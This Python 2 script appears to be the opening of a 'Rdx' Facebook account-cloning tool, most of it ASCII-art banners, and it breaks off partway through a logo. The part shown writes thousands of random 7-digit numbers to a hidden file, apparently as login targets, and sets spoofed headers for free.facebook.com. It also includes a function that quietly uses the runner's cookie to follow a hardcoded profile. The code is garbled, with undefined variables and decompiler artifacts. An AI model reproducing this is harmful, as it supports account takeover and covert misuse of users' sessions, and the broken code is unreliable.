import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip install mechanize')
    time.sleep(1)
    os.system('python Cloning.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
free_fb = session.get('https://free.facebook.com').text
br.addheader_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1'}
br.addheader_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1'}
def keluar():
	print ('Rdx ')
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text


def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;91m'
R='\033[1;94m'
G='\033[1;97m'
W='\033[1;95m'
S='\033[1;93m'
P='\033[1;92m'
Y='\033[1;96m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#Dev:Rdx
##### LOGO #####
logo = """

\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 9
\033[1;93m\033[1;92m?\033[1;93m? Facebook\033[1;94m?\033[1;95m?\033[1;93m  \033[1;96m?\033[1;93mtokenx \033[1;92m?\033[1;95m?
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo2 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«---------------\033[1;91mRdx\033[1;95m-----------------»"""
logo3 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo4 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo5 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo6 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
     
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo7 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo8 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo9 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo10 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo11 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo12 = """
\033[1;91m•~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
¦-¦++++--+¦¦+++-+-+¦+-+++¦ ¦++++++++¦
¦¦¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦¦¦¦¦++¦ ¦¦¦¦¦¦+++¦
¦-+++++--+¦¦+++++-+-+-+++¦ ¦++++++++¦
~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo13 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo14 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo15 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo16 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«--------------\033[1;91mRdx\033[1;95m-----------------»"""
logo17 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 

\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo18 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 

\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo19 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
                                
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo20 = """
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 

\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo21 = """	
\033[1;91m ,------. ,------. ,--.   ,--. 
\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
\033[1;91m |  '--'.'|  |  \  : .'    \   
\033[1;91m |  |\  \ |  '--'  //  .'.  \  
\033[1;91m `--' '--'`-------''--'   '--' 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"""
logo22 = """
\033[1;97m

                                                        
,------. ,------. ,--.   ,--.     ,--.   ,--.      ,--. 
|  .--. '|  .-.  \ \  `.'  /,-----.\  `.'  /,--,--.`--' 
|  '--'.'|  |  \  : .'    \ '-----' \     /' ,-.  |,--. 
|  |\  \ |  '--'  //  .'.  \         \   / \ '-'  ||  | 
`--' '--'`-------''--'   '--'         `-'   `--`--'`--' 
                                                        

\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo23 = """
\033[1;97m    Rdx  Report 
\033[1;97m ____                       _
\033[1;97m|  _ \ ___ _ __   ___  _ __| |_
\033[1;97m| |_) / _ \ '_ \ / _ \| '__| __|
\033[1;97m|  _ <  __/ |_) | (_) | |  | |_
\033[1;97m|_| \_\___| .__/ \___/|_|   \__|
\033[1;97m          |_|
\033[1;97m    Rdx  Report 
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo24 = """
\033[1;97m Rdx  Information 
\033[1;97m  ____       _        _ _
\033[1;97m |  _ \  ___| |_ __ _(_) |
\033[1;97m | | | |/ _ \ __/ _` | | |
\033[1;97m | |_| |  __/ || (_| | | |
\033[1;97m |____/ \___|\__\__,_|_|_|
\033[1;97m 
\033[1;97m Rdx  Information 
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo25 = """
\033[1;97m Rdx  Login 
\033[1;97m  _             _
\033[1;97m | | ___   __ _(_)_ __
\033[1;97m | |/ _ \ / _` | | '_ \
\033[1;97m | | (_) | (_| | | | | |
\033[1;97m |_|\___/ \__, |_|_| |_|
\033[1;97m          |___/
\033[1;97m Rdx  Login 
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo26 = """
\033[1;97m
        
▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  ▄       ▄                                                                                                   
▐░░░░░░░░░░░▌▐░░░░░░░░░░▌▐░▌     ▐░▌                                                                                                  
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌                                                                                                   
▐░▌       ▐░▌▐░▌       ▐░▌ ▐░▌ ▐░▌                                                                                                    
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌  ▐░▐░▌                                                                                                     
▐░░░░░░░░░░░▌▐░▌       ▐░▌   ▐░▌                                                                                                      
▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌  ▐░▌░▌                                                                                                     
▐░▌     ▐░▌  ▐░▌       ▐░▌ ▐░▌ ▐░▌                                                                                                    
▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌   ▐░▌                                                                                                   
▐░▌       ▐░▌▐░░░░░░░░░░▌▐░▌     ▐░▌                                                                                                  
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀  ▀       ▀
\033[1;97m«-----------------\033[1;97m Rdx \033[1;97m-----------------»"""
logo27 = """
\033[1;97m
╔╗──────────╔══╗╔╗───────╔╗────────╔╗──
║║──────────║╔╗║║║───────║║────────║║──
║╚═╗╔══╗╔═╗─║╚╝║║║─╔══╗╔═╝║╔══╗╔══╗║╚═╗
║╔╗║║╔╗║║╔╗╗╚═╗║║║─║╔╗║║╔╗║║║═╣║══╣║╔╗║
║╚╝║║╔╗║║║║║╔═╝║║╚╗║╔╗║║╚╝║║║═╣─══║║║║║
╚══╝╚╝╚╝╚╝╚╝╚══╝╚═╝╚╝╚╝╚══╝╚══╝╚══╝╚╝╚╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo28 = """
\033[1;97m

██████████████████████████████████████████████
█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█
██████████████████████████████████████████████
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo29 = """
\033[1;97m

█████████████████████████████████
█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
█████████████████████████████████
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo30 = """
\033[1;97m

██╗███╗░░██╗██████╗░██╗░█████╗░
██║████╗░██║██╔══██╗██║██╔══██╗
██║██╔██╗██║██║░░██║██║███████║
██║██║╚████║██║░░██║██║██╔══██║
██║██║░╚███║██████╔╝██║██║░░██║
╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚═╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo31 = """
\033[1;97m
╔══╗─╔═══╗╔═══╗╔════╗╔══╗╔╗───
║╔╗║─║╔═╗║║╔═╗║╚══╗═║╚╣─╝║║───
║╚╝╚╗║╚═╝║║║─║║──╔╝╔╝─║║─║║───
║╔═╗║║╔╗╔╝║╚═╝║─╔╝╔╝──║║─║║─╔╗
║╚═╝║║║║╚╗║╔═╗║╔╝═╚═╗╔╣─╗║╚═╝║
╚═══╝╚╝╚═╝╚╝─╚╝╚════╝╚══╝╚═══╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo32 = """
\033[1;97m
─╚╝────╔══╗────────
─╔╗────║╔╗║────────
─║║╔══╗║╚╝║╔══╗╔═╗─
─║║║╔╗║║╔═╝║╔╗║║╔╗╗
╔╝║║╔╗║║║──║╔╗║║║║║
╚═╝╚╝╚╝╚╝──╚╝╚╝╚╝╚╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo33 = """
\033[1;97m
╔╗╔═╗╔═══╗╔═══╗╔══╗╔═══╗
║║║╔╝║╔═╗║║╔═╗║╚╣─╝║╔═╗║
║╚╝╝─║║─║║║╚═╝║─║║─║║─║║
║╔╗║─║║─║║║╔╗╔╝─║║─║╚═╝║
║║║╚╗║╚═╝║║║║╚╗╔╣─╗║╔═╗║
╚╝╚═╝╚═══╝╚╝╚═╝╚══╝╚╝─╚╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo34 = """
\033[1;97m
 ▀ ▀█▀ ▄▀▄ █░░ ▀▄░▄▀
 █ ░█░ █▀█ █░▄ ░░█░░
 ▀ ░▀░ ▀░▀ ▀▀▀ ░░▀░░
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo35 = """
\033[1;97m
▒▄█▀▀█▒▐█▀█░░▄█▀▄─▐██▒██▄░▒█▌
▒▀▀█▄▄▒▐█▄█░▐█▄▄▐█░█▌▒▐█▒█▒█░
▒█▄▄█▀▒▐█░░░▐█─░▐█▐██▒██░▒██▌
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo36 = """
\033[1;97m
╔═╗───────────────╔╗
║╬║╔═╗╔╗─╔═╗─╔═╦╗╔╝║
║╔╝║╬║║╚╗║╬╚╗║║║║║╬║
╚╝─╚═╝╚═╝╚══╝╚╩═╝╚═╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo37 = """
\033[1;97m

████████████████████████████████████████████████
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███
█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▒▒▒▒█████████▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
████████████████████████████████████████████████
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo38 = """
\033[1;97m
 ▀ █▄░█ █▀▄ ▄▀▄ █▄░█ ▄▀▄ ▄▀▀ ▀ ▄▀▄
 █ █░▀█ █░█ █░█ █░▀█ █▀█ ░▀▄ █ █▀█
 ▀ ▀░░▀ ▀▀░ ░▀░ ▀░░▀ ▀░▀ ▀▀░ ▀ ▀░▀
\033[1;97m«-----------------\033[1;97m Rdx \033[1;97m-----------------»"""
logo39 = """
\033[1;97m
 ▄▀▀░ █▀▀▄ █▀▀ ▄▀ █▀▀ █▀▀
 █░▀▌ █▐█▀ █▀▀ █░ █▀▀ █▀▀
 ▀▀▀░ ▀░▀▀ ▀▀▀ ░▀ ▀▀▀ ▀▀▀
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo40 = """
\033[1;97m
╔══╗╔╦╗╔══╗╔══╗╔═╗╔══╗╔╗─╔══╗╔══╗
║╔╗║║║║║══╣╚╗╔╝║╬║║╔╗║║║─╚║║╝║╔╗║
║╠╣║║║║╠══║─║║─║╗╣║╠╣║║╚╗╔║║╗║╠╣║
╚╝╚╝╚═╝╚══╝─╚╝─╚╩╝╚╝╚╝╚═╝╚══╝╚╝╚╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo41 = """
\033[1;97m
╔═══╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
║╔═╗║║╔═╗║║║╚╗║║╚╗╔╗║║╔═╗║
║║─╚╝║║─║║║╔╗╚╝║─║║║║║║─║║
║║─╔╗║╚═╝║║║╚╗║║─║║║║║╚═╝║
║╚═╝║║╔═╗║║║─║║║╔╝╚╝║║╔═╗║
╚═══╝╚╝─╚╝╚╝─╚═╝╚═══╝╚╝─╚╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo42 = """
\033[1;97m
░▐█▀█░▐█░▐█░▐██▒██▄░▒█▌░░▄█▀▄─
░▐█──░▐████─░█▌▒▐█▒█▒█░░▐█▄▄▐█
░▐█▄█░▐█░▐█░▐██▒██░▒██▌░▐█─░▐█
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo43 = """
\033[1;97m
──╔╗───────────────────╔╗──
──║║───────────────────║║──
╔═╝║╔══╗╔═╗─╔╗╔╗╔══╗╔═╗║║╔╗
║╔╗║║║═╣║╔╗╗║╚╝║║╔╗║║╔╝║╚╝╝
║╚╝║║║═╣║║║║║║║║║╔╗║║║─║╔╗╗
╚══╝╚══╝╚╝╚╝╚╩╩╝╚╝╚╝╚╝─╚╝╚╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo44 = """
\033[1;97m
─╔═╗───────────────────
─║╔╝───────────────────
╔╝╚╗╔═╗╔══╗╔═╗─╔══╗╔══╗
╚╗╔╝║╔╝║╔╗║║╔╗╗║╔═╝║║═╣
─║║─║║─║╔╗║║║║║║╚═╗║║═╣
─╚╝─╚╝─╚╝╚╝╚╝╚╝╚══╝╚══╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo45 = """
\033[1;97m
╔══╗───────────────────╔╗─╔╗
║╔╗║───────────────────║║─║║
║╚╝║╔══╗╔═╗╔╗╔╗╔══╗╔═╗─║╚═╝║
╚═╗║║║═╣║╔╝║╚╝║║╔╗║║╔╗╗╚═╗╔╝
╔═╝║║║═╣║║─║║║║║╔╗║║║║║╔═╝║─
╚══╝╚══╝╚╝─╚╩╩╝╚╝╚╝╚╝╚╝╚══╝─
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo46 = """
\033[1;97m
────────╔╗─────╔╗─╔╗──────────
────────║║─────║║─║║──────────
╔╗╔╗╔══╗║║─╔══╗║╚═╝║╔══╗╔╗╔══╗
║╚╝║║╔╗║║║─║╔╗║╚═╗╔╝║══╣─╣║╔╗║
║║║║║╔╗║║╚╗║╔╗║╔═╝║──══║║║║╔╗║
╚╩╩╝╚╝╚╝╚═╝╚╝╚╝╚══╝─╚══╝╚╝╚╝╚╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo47 = """
\033[1;97m
─────────╔╗─────────╔╗──────
─────────║║─────────║║──────
╔══╗╔═╗╔╗║║─╔══╗╔═╗─║║╔╗╔══╗
║══╣║╔╝─╣║║─║╔╗║║╔╗╗║╚╝╝║╔╗║
─══║║║─║║║╚╗║╔╗║║║║║║╔╗╗║╔╗║
╚══╝╚╝─╚╝╚═╝╚╝╚╝╚╝╚╝╚╝╚╝╚╝╚╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo48 = """
\033[1;97m
╔════╗╔╗─╔╗╔═══╗╔╗╔═╗╔═══╗╔╗──╔╗
║╔╗╔╗║║║─║║║╔═╗║║║║╔╝║╔══╝║╚╗╔╝║
╚╝║║╚╝║║─║║║╚═╝║║╚╝╝─║╚══╗╚╗╚╝╔╝
──║║──║║─║║║╔╗╔╝║╔╗║─║╔══╝─╚╗╔╝─
──║║──║╚═╝║║║║╚╗║║║╚╗║╚══╗──║║──
──╚╝──╚═══╝╚╝╚═╝╚╝╚═╝╚═══╝──╚╝──
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo49 = """
\033[1;97m
╔╗─╔╗╔═══╗╔═══╗
║║─║║║╔═╗║║╔══╝
║║─║║║║─║║║╚══╗
║║─║║║╚═╝║║╔══╝
║╚═╝║║╔═╗║║╚══╗
╚═══╝╚╝─╚╝╚═══╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo50 = """
\033[1;97m
──────────╔╗─────────────╔╗────────
──────────║║─────────────║║────────
╔══╗╔╗╔╗╔═╝║╔╗╔══╗╔═╗╔══╗║╚═╗╔╗╔══╗
║══╣║║║║║╔╗║─╣║╔╗║║╔╝║╔╗║║╔╗║─╣║╔╗║
─══║║╚╝║║╚╝║║║║╔╗║║║─║╔╗║║╚╝║║║║╔╗║
